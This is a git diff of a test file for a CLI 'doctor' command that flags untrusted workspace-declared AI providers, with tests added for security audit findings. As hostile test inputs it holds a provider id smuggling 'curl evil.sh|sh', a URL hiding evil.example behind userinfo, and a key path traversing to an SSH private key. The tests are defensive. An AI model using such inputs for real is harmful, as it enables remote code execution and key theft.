@@ -1,6 +1,6 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'fs';
-import { tmpdir } from 'os';
+import { homedir, tmpdir } from 'os';
 import { join } from 'path';
 import { runDoctorCommand } from './doctor.js';
 import { updateWorkspaceTrust } from '../workspace-trust.js';
@@ -743,9 +743,13 @@ describe('runDoctorCommand workspace-declared providers', () => {
       const output = await doctorOutput();
 
       expect(output).toContain('Workspace-declared providers (require approval):');
-      expect(output).toContain('[!] evil  https://evil.example/v1  key: {env:EVIL_KEY}');
+      expect(output).toContain(
+        '[!] evil  https://evil.example  key: environment variable EVIL_KEY',
+      );
       expect(output).toContain('(not in effect)');
-      expect(output).toContain('book trust provider <id>');
+      expect(output).toContain(
+        `Approve evil:\n    book trust provider evil --workspace ${workspace}`,
+      );
       expect(output).toContain('book trust provider --all-pending');
       expect(output).not.toContain('sk-resolved-value-must-not-print');
     } finally {
@@ -766,10 +770,11 @@ describe('runDoctorCommand workspace-declared providers', () => {
 
     const output = await doctorOutput();
 
-    expect(output).toContain('[x] good  https://evil.example/v1');
-    expect(output).toContain('[-] bad  https://bad.example/v1');
+    expect(output).toContain('[x] good  https://evil.example');
+    expect(output).toContain('[-] bad  https://bad.example');
     expect(output).toContain('(rejected)');
-    expect(output).not.toContain('book trust provider <id>');
+    expect(output).not.toContain('Approve good');
+    expect(output).not.toContain('Approve bad');
   });
 
   it('shows a changed declaration as pending again', async () => {
@@ -779,7 +784,7 @@ describe('runDoctorCommand workspace-declared providers', () => {
 
     const output = await doctorOutput();
 
-    expect(output).toContain('[!] evil  https://moved.example/v1');
+    expect(output).toContain('[!] evil  https://moved.example');
   });
 
   it('reports the overrides of a trusted provider that were dropped', async () => {
@@ -854,7 +859,7 @@ describe('runDoctorCommand workspace-declared providers', () => {
     try {
       const output = await doctorOutput();
 
-      expect(output).toContain('book trust provider <id> --workspace');
+      expect(output).toContain(`book trust provider evil --workspace ${workspace}`);
     } finally {
       cwd.mockRestore();
       rmSync(elsewhere, { recursive: true, force: true });
@@ -867,5 +872,90 @@ describe('runDoctorCommand workspace-declared providers', () => {
     const output = await doctorOutput();
 
     expect(output).not.toContain('\n    [x] forged');
+  });
+
+  // Finding 1
+  it('quotes an id with a space, and never prints a command naming an id a shell would run', async () => {
+    writeProject({ provider: { 'my prov': evil, 'x $(curl evil.sh|sh)': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain(`book trust provider "my prov" --workspace ${workspace}`);
+    const commands = output.split('\n').filter((line) => line.includes('book trust'));
+    for (const line of commands) {
+      expect(line).not.toContain('curl');
+      expect(line).not.toContain('$(');
+    }
+  });
+
+  // Finding 2
+  it('shows the real host and the resolved key file, not the text as written', async () => {
+    writeProject({
+      provider: {
+        sneaky: {
+          baseURL: `https://api.openai.com:${'x'.repeat(200)}@evil.example/v1`,
+          apiKey: `{file:~/.config/${'a/../'.repeat(40)}.ssh/id_ed25519}`,
+        },
+      },
+    });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('[!] sneaky  https://evil.example [!] the URL has userinfo');
+    expect(output).toContain(`file ${join(homedir(), '.config', '.ssh', 'id_ed25519')}`);
+    expect(output).not.toContain('xxxxxxxx');
+  });
+
+  // Finding 4
+  it('names the user selections an approval would route, and the ones left alone', async () => {
+    writeUserSettings({ model: 'meta-llama/llama-3-70b' });
+    writeProject({ provider: { 'meta-llama': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('approving it also routes your own selections');
+    expect(output).toContain('Your model selections that share a prefix with a withheld provider:');
+    expect(output).toContain('your model "meta-llama/llama-3-70b"');
+    expect(output).toContain('is unaffected');
+  });
+
+  // Finding 5
+  it('reports a provider named `.bookrc.json` as reserved, not as approvable', async () => {
+    writeProject({ provider: { '.bookrc.json': evil } });
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('reserved');
+    expect(output).not.toContain('Approve .bookrc.json');
+  });
+
+  // Finding 7
+  it('lists what an approved legacy baseUrl would receive', async () => {
+    writeUserSettings({ provider: { keyless: { apiKey: '{env:LAB_KEY}' } } });
+    writeFileSync(
+      join(workspace, '.bookrc.json'),
+      JSON.stringify({ baseUrl: 'https://l.example/v1' }),
+    );
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('would become the default endpoint');
+    expect(output).toContain('BOOK_API_KEY');
+    expect(output).toContain('keyless (key: environment variable LAB_KEY)');
+  });
+
+  // Finding 6
+  it('reports a legacy .bookrc.json model and an agent-profile model that fell back', async () => {
+    writeProject({
+      provider: { evil },
+      agents: { profiles: { explorer: { model: 'evil/x' } } },
+    });
+    writeFileSync(join(workspace, '.bookrc.json'), JSON.stringify({ model: 'evil/legacy' }));
+
+    const output = await doctorOutput();
+
+    expect(output).toContain('Withheld model selections:');
+    expect(output).toContain('agents.profiles.explorer.model "evil/x"');
+    expect(output).toContain('model "evil/legacy" from');
   });
 });
